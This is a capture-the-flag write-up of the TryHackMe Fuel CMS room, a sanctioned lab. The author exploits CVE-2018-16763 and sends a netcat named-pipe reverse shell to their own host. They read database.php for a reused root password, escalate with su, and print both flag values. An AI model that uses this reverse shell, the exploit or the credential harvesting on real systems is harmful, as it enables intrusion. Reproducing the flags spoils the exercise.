> [!summary]
> A new start-up has a few issues with their web server.
> Root the box! Designed and created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471), built by [Paradox](https://tryhackme.com/p/Paradox).

> [!important]
> Target ip: 10.66.139.221

> [!important]
> Find User.txt

> [!info]
> Ok Root box is end goal. I need to enumerate. I'll use gobuster/nmap/browse the site for vulns.

> [!note]
> I ran the following scans and got the following results from nmap/gobuster/site respectively:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -p- 10.66.139.221 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 04:42 EST
Nmap scan report for 10.66.139.221
Host is up (0.084s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/8%OT=80%CT=1%CU=33032%PV=Y%DS=3%DC=T%G=Y%TM=69885B27
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=I%TS=A)SEQ(SP=10
OS:2%GCD=1%ISR=10C%TI=Z%CI=I%TS=A)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%TS=A)S
OS:EQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=
OS:I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4E8ST11NW7%
OS:O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W
OS:6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)

Network Distance: 3 hops

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   83.58 ms 192.168.128.1
2   ...
3   83.90 ms 10.66.139.221

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.11 seconds
```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.66.139.221/ -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.139.221/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/@                    (Status: 400) [Size: 1134]
/0                    (Status: 200) [Size: 16597]
/assets               (Status: 301) [Size: 315] [--> http://10.66.139.221/assets/]                                                                    
/home                 (Status: 200) [Size: 16597]
/index                (Status: 200) [Size: 16597]
/index.php            (Status: 200) [Size: 16597]
/lost+found           (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 301]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

> [!info]
> before getting into the site section as its a lot of enumeration I did, nmap revealed only 1 port available which was port 80 and gobuster revealed a few filepaths to try so I included them below and will review them with more information.

![](assets/Fuel%20CMS%20v1.4%20main%20site.png)
![](assets/robots.txt.png)
![](assets/login%20with%20base64%20encoded.png)
![](assets/Pasted%20image%2020260208095840.png)
![](assets/admin%20login.png)
> [!note]
> As you can see, I am in with admin:admin already but i need to get a reverse shell to be able to get user & root flag as Fuel CMS version is 1.4 and CVE-2018-16763 targets this with RCE.

> [!note]
> Went on exploit DB and got a python script to spawn a pseudo-terminal shell setup which can be upgraded via reverse shell and python cmds as follows:

```
┌──(kali㉿kali)-[~]
└─$ python3 fuel_exploit.py -u http://10.66.139.221/
[+]Connecting...
Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.144.173 4444 >/tmp/f
```
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                                
listening on [any] 4444 ...
connect to [192.168.144.173] from (UNKNOWN) [10.66.139.221] 40596
bash: cannot set terminal process group (1041): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html$ ls
```
```
www-data@ubuntu:/var/www/html$ ls
ls
README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
www-data@ubuntu:/var/www/html$ cd ..
cd ..
www-data@ubuntu:/var/www$  cd ..
 cd ..
www-data@ubuntu:/var$ cd ..
cd ..
www-data@ubuntu:/$ cd ..
cd ..
www-data@ubuntu:/$ whoami 
whoami
www-data
www-data@ubuntu:/$ cd root
cd root
bash: cd: root: Permission denied
www-data@ubuntu:/$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd w
cd www-data/
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat fla
cat flag.txt 
6470e394cbf6dab6a91682cc8585059b 
```

> [!important]
> Found the User.txt flag as above

> [!info]
> Need to know how to privilege escalate now but I dont know sudo password...

> [!note]
> After trial/error of many types of privilege escalation, I realised the original site contained all the info I need to enumerate further so looking at the following info:
![](assets/DB%20config%20data.png)
I was able to determine where I would need to go to find some information and if I didnt, there was still more info on the site to help me enumerate further.

```
$ cd fuel
cd fuel
$ ls
ls
application  data_backup  install   modules
codeigniter  index.php    licenses  scripts
$ cd application
cd application
$ ls
ls
cache   controllers  helpers  index.html  libraries  migrations  third_party
config  core         hooks    language    logs       models      views
$ cd config
cd config
$ ls
ls
MY_config.php        constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
$ cat database.php
cat database.php
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE

$ su root
su root
Password: mememe
root@ubuntu:~# pwd
pwd
/root
root@ubuntu:~# ls -la
ls -la
total 32
drwx------  4 root root 4096 Jul 26  2019 .
drwxr-xr-x 24 root root 4096 Jul 26  2019 ..
-rw-------  1 root root  357 Jul 26  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 26  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   34 Jul 26  2019 root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d
```
![](assets/Great%20Success.png)